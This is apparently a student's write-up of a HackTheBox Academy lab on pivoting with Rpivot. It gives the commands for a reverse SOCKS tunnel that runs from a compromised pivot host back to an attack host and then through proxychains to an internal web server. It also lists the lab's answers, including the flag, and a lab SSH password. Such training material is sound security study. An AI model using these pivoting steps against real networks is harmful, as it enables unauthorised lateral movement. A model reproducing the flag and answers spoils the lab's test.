# Web Server Pivoting with Rpivot

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1434](https://academy.hackthebox.com/module/158/section/1434) |

---

## 🔑 Key Concepts

- **Rpivot** — reverse SOCKS proxy tool, works at Layer 4
- `server.py` runs on **attack host**, `client.py` runs on **pivot host**
- No SSH tunnel required — client connects back to server

### Flow
```
Attack Host (server.py) ←—— Pivot Host (client.py) ——→ Internal Target
proxychains → SOCKS:9050 ————————————————————————————→ 172.16.5.x
```

---

## 🛠️ Key Commands

### Clone Rpivot
```bash
git clone https://github.com/klsecservices/rpivot.git
```

### Transfer to Pivot Host
```bash
scp -r rpivot ubuntu@<pivot_host>:/home/ubuntu/
```

### Start Server on Attack Host
```bash
cd rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### Start Client on Pivot Host
```bash
cd rpivot
python2.7 client.py --server-ip <tun0_ip> --server-port 9999
```

### Check tun0 IP (Attack Host)
```bash
ip a show tun0
```

### Access Internal Web Server via Proxychains
```bash
proxychains firefox-esr http://<internal_target_ip>:80
```

---

## ❓ Questions

### Q1 — From which host does server.py run?
**Answer:** `Attack Host`

### Q2 — From which host does client.py run?
**Answer:** `Pivot Host`

### Q3 — Flag on internal web server (172.16.5.135)
**Answer:** `I_L0v3_Pr0xy_Ch@ins`

```bash
# TERMINAL 1 — Kali (Attack Host)
cd ~/rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# TERMINAL 2 — WEB01 (Pivot Host)
ssh ubuntu@<pivot_host>   # pass: HTB_@cademy_stdnt!
python2.7 client.py --server-ip 10.10.15.221 --server-port 9999

# TERMINAL 3 — Kali
proxychains firefox-esr http://172.16.5.135:80
# Flag visible on Apache default page
```
